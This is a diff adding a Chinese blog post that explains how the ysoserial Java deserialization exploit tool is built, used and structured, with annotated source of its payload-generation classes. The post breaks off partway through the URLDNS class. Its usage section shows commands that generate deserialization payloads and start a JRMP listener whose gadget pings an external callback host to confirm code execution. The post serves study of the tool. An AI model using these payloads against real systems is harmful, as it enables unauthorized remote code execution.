@@ -1,0 +1,353 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,ysoserial,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>ysoserial系列之工具浅析 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        ysoserial系列之工具浅析
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-10-22T06:57:31.000Z">
+        2021-10-22
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ysoserial/">ysoserial</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>ysoserial系列文章第一篇，主要讲讲工具的用法和基本架构。</p>
+<h2 id="0x01-ysoserial简介"><a href="#0x01-ysoserial简介" class="headerlink" title="0x01 ysoserial简介"></a>0x01 ysoserial简介</h2><p>项目地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>ysoserial是一款Java反序列化漏洞利用神器，其中集成了许多反序列化利用Gadgets。</p>
+<h2 id="0x02-下载编译"><a href="#0x02-下载编译" class="headerlink" title="0x02 下载编译"></a>0x02 下载编译</h2><p>前提是安装好Java 1.7+和Maven 3.x+环境。</p>
+<p>先clone最新版到本地：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git</span><br></pre></td></tr></table></figure>
+<p>进入ysoserial目录中，编译jar包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p>终端输出如图则说明成功编译：</p>
+<p><img src="/2021/10/22/ysoserial系列之工具浅析/1.png" alt=""></p>
+<p>此时在ysoserial\target目录中就可以看到生成的ysoserial-0.0.6-SNAPSHOT-all.jar文件。</p>
+<h2 id="0x03-基本用法"><a href="#0x03-基本用法" class="headerlink" title="0x03 基本用法"></a>0x03 基本用法</h2><p>官方介绍中的基本用法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar [payload] <span class="string">'[command]'</span></span><br></pre></td></tr></table></figure>
+<p>这种是运行ysoserial中的主类函数，比如常用的打DNSLog：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xxx.dnslog.cn/</span><br></pre></td></tr></table></figure>
+<p>此外，还有一种常见用法，即运行ysoserial中的exploit类，一般用于开启交互服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">'ping -c 2  rce.267hqw.ceye.io'</span></span><br></pre></td></tr></table></figure>
+<p>这里再提一下，java命令的<code>-cp</code>参数和<code>-classpath</code>参数是一样的，即指定类运行所依赖类路径、通常是类库和jar包。而java命令的<code>-jar</code>参数则直接执行jar包里面<code>META-INF\MANIFEST.MF</code>文件中指定的Main-Class。</p>
+<h2 id="0x04-项目结构"><a href="#0x04-项目结构" class="headerlink" title="0x04 项目结构"></a>0x04 项目结构</h2><p>主要看下源码下main目录的结构：</p>
+<p><img src="/2021/10/22/ysoserial系列之工具浅析/2.png" alt=""></p>
+<p>简单说明如下：</p>
+<ul>
+<li>exploit：漏洞利用库，如JRMP服务端和客户端等；</li>
+<li>payloads：payload库，即Gadgets集合，根据选择的Gadget来生成对应的字节码；</li>
+<li>secmgr：安全管理器相关；</li>
+</ul>
+<h2 id="0x05-源码浅析"><a href="#0x05-源码浅析" class="headerlink" title="0x05 源码浅析"></a>0x05 源码浅析</h2><h3 id="入口类GeneratePayload"><a href="#入口类GeneratePayload" class="headerlink" title="入口类GeneratePayload"></a>入口类GeneratePayload</h3><p>在pom.xml中看到，ysoserial.jar的MainClass是ysoserial.GeneratePayload类：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;-$&#123;project.version&#125;-all<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">appendAssemblyId</span>&gt;</span>false<span class="tag">&lt;/<span class="name">appendAssemblyId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>ysoserial.GeneratePayload<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                 <span class="tag">&lt;<span class="name">descriptor</span>&gt;</span>assembly.xml<span class="tag">&lt;/<span class="name">descriptor</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看到GeneratePayload类，如注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratePayload</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERNAL_ERROR_CODE = <span class="number">70</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> USAGE_CODE = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 判断输入参数，第一个为payload类型，第二个为payload的参数</span></span><br><span class="line">		<span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">			printUsage();</span><br><span class="line">			System.exit(USAGE_CODE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">final</span> String payloadType = args[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">final</span> String command = args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取payload指定的类，从ysoserial.payload包中寻找</span></span><br><span class="line">        <span class="comment">// 这里用到了泛型，指定类型为ObjectPayload接口类的实现类</span></span><br><span class="line">		<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">		<span class="keyword">if</span> (payloadClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">			System.err.println(<span class="string">"Invalid payload type '"</span> + payloadType + <span class="string">"'"</span>);</span><br><span class="line">			printUsage();</span><br><span class="line">			System.exit(USAGE_CODE);</span><br><span class="line">			<span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 新建ObjectPayload类对象</span></span><br><span class="line">			<span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">            <span class="comment">// 调用ObjectPayload类对象的getObject()函数来获取要序列化的payload对象，该对象将在反序列化时执行指定的命令</span></span><br><span class="line">			<span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">			PrintStream out = System.out;</span><br><span class="line">            <span class="comment">// 序列化payload对象</span></span><br><span class="line">			Serializer.serialize(object, out);</span><br><span class="line">            <span class="comment">// 释放payload对象</span></span><br><span class="line">			ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">			System.err.println(<span class="string">"Error while generating or serializing payload"</span>);</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">		&#125;</span><br><span class="line">		System.exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印输入参数帮助文档</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.err.println(<span class="string">"Y SO SERIAL?"</span>);</span><br><span class="line">		System.err.println(<span class="string">"Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'"</span>);</span><br><span class="line">		System.err.println(<span class="string">"  Available payload types:"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> List&lt;Class&lt;? extends ObjectPayload&gt;&gt; payloadClasses =</span><br><span class="line">			<span class="keyword">new</span> ArrayList&lt;Class&lt;? extends ObjectPayload&gt;&gt;(ObjectPayload.Utils.getPayloadClasses());</span><br><span class="line">		Collections.sort(payloadClasses, <span class="keyword">new</span> Strings.ToStringComparator()); <span class="comment">// alphabetize</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String[]&gt; rows = <span class="keyword">new</span> LinkedList&lt;String[]&gt;();</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">"Payload"</span>, <span class="string">"Authors"</span>, <span class="string">"Dependencies"</span>&#125;);</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">"-------"</span>, <span class="string">"-------"</span>, <span class="string">"------------"</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;? extends ObjectPayload&gt; payloadClass : payloadClasses) &#123;</span><br><span class="line">             rows.add(<span class="keyword">new</span> String[] &#123;</span><br><span class="line">                payloadClass.getSimpleName(),</span><br><span class="line">                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), <span class="string">", "</span>, <span class="string">"@"</span>, <span class="string">""</span>),</span><br><span class="line">                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),<span class="string">", "</span>, <span class="string">""</span>, <span class="string">""</span>)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String&gt; lines = Strings.formatTable(rows);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">            System.err.println(<span class="string">"     "</span> + line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里借用上参考文章的图，会对GeneratePayload类中的大致调用过程比较清晰：</p>
+<p><img src="/2021/10/22/ysoserial系列之工具浅析/3.png" alt=""></p>
+<p>下面就先按上图顺序来逐个看看各个模块的作用。</p>
+<h3 id="ObjectPayload-Utils类"><a href="#ObjectPayload-Utils类" class="headerlink" title="ObjectPayload.Utils类"></a>ObjectPayload.Utils类</h3><p>由前面看到在入口类GeneratePayload中调用得比较多的是Utils类。Utils类是位于ysoserial.payloads.ObjectPayload接口类的内部类，分析说明如注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.reflections.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.GeneratePayload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectPayload接口类，payload包中的Gadget类都是其实现类，且必须重写getObject()函数</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( <span class="string">"rawtypes"</span> )</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObjectPayload</span> &lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * return armed payload object to be serialized that will execute specified</span></span><br><span class="line"><span class="comment">     * command on deserialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内部类Utils</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过扫描ClassPath来获取指定payload类</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Set&lt;Class&lt;? extends ObjectPayload&gt;&gt; getPayloadClasses () &#123;</span><br><span class="line">            <span class="keyword">final</span> Reflections reflections = <span class="keyword">new</span> Reflections(ObjectPayload.class.getPackage().getName());</span><br><span class="line">            <span class="keyword">final</span> Set&lt;Class&lt;? extends ObjectPayload&gt;&gt; payloadTypes = reflections.getSubTypesOf(ObjectPayload.class);</span><br><span class="line">            <span class="keyword">for</span> ( Iterator&lt;Class&lt;? extends ObjectPayload&gt;&gt; iterator = payloadTypes.iterator(); iterator.hasNext(); ) &#123;</span><br><span class="line">                Class&lt;? extends ObjectPayload&gt; pc = iterator.next();</span><br><span class="line">                <span class="keyword">if</span> ( pc.isInterface() || Modifier.isAbstract(pc.getModifiers()) ) &#123;</span><br><span class="line">                    iterator.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payloadTypes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在入口类GeneratePayload中调用获取指定payload类对象</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span> ( <span class="string">"unchecked"</span> )</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;? extends ObjectPayload&gt; getPayloadClass ( <span class="keyword">final</span> String className ) &#123;</span><br><span class="line">            Class&lt;? extends ObjectPayload&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 直接通过类名来获取指定类</span></span><br><span class="line">                clazz = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;&#125;</span><br><span class="line">            <span class="keyword">if</span> ( clazz == <span class="keyword">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果上述获取不到，则通过指定GeneratePayload类所在包路径来获取payloads包中指定类</span></span><br><span class="line">                    <span class="keyword">return</span> clazz = (Class&lt;? extends ObjectPayload&gt;) Class</span><br><span class="line">                            .forName(GeneratePayload.class.getPackage().getName() + <span class="string">".payloads."</span> + className);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( Exception e2 ) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( clazz != <span class="keyword">null</span> &amp;&amp; !ObjectPayload.class.isAssignableFrom(clazz) ) &#123;</span><br><span class="line">                clazz = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建指定payload类对象，主要为java -cp用法即调用exploit模块，用于生成服务协议相关的交互式序列化利用链</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makePayloadObject</span> <span class="params">( String payloadType, String payloadArg )</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 获取指定payload类</span></span><br><span class="line">            <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = getPayloadClass(payloadType);</span><br><span class="line">            <span class="keyword">if</span> ( payloadClass == <span class="keyword">null</span> || !ObjectPayload.class.isAssignableFrom(payloadClass) ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid payload type '"</span> + payloadType + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Object payloadObject;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 新建payload类对象</span></span><br><span class="line">                <span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">                <span class="comment">// 调用指定payload类的getObject()方法，生成Gadget对象并返回</span></span><br><span class="line">                payloadObject = payload.getObject(payloadArg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Failed to construct payload"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payloadObject;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 释放payload对象</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span> ( <span class="string">"unchecked"</span> )</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">releasePayload</span> <span class="params">( ObjectPayload payload, Object object )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ( payload <span class="keyword">instanceof</span> ReleaseableObjectPayload ) &#123;</span><br><span class="line">                ( (ReleaseableObjectPayload) payload ).release(object);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">releasePayload</span> <span class="params">( String payloadType, Object payloadObject )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = getPayloadClass(payloadType);</span><br><span class="line">            <span class="keyword">if</span> ( payloadClass == <span class="keyword">null</span> || !ObjectPayload.class.isAssignableFrom(payloadClass) ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid payload type '"</span> + payloadType + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">                releasePayload(payload, payloadObject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payloads包"><a href="#payloads包" class="headerlink" title="payloads包"></a>payloads包</h3><p>payloads包中的payload类是ysoserial工具的核心所在，其中包括大量反序列化Gadget链，当前只说说payload类在整个ysoserial工具中的运作流程，具体每个payload类的原理及构造利用过程将在后续系列中来说明。</p>
+<p>前面注释中说到了payload包中的Gadget类都是ObjectPayload接口类的实现类，且必须重写其getObject()函数。也就是说，如果我们要自己添加新Gadget类，必须实现ObjectPayload接口类并重写getObject()函数，同时还需要编写main()函数中添加PayloadRunner测试方法。</p>
+<p>以payload包中URLDNS类为例说明，其是实现了ObjectPayload接口，并重写了getObject()函数、该函数返回一个构造好的恶意的HashMap对象。比如在前面的基本用法<code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xxx.dnslog.cn/</code>中，指定了URLDNS这个payload类的，那么在GeneratePayload入口类中获取到payload类名和命令参数值后就会调用Utils类的getPayloadClass()函数获取到URLDNS类对象，再通过调用该URLDNS类的getObject()函数将命令参数值传入来构造恶意反序列化Gadget链对象并返回对象，最后序列化该恶意构造的Gadget对象输出后便释放：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PayloadTest</span>(skip = <span class="string">"true"</span>)</span><br><span class="line"><span class="meta">@Dependencies</span>()</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.GEBL &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        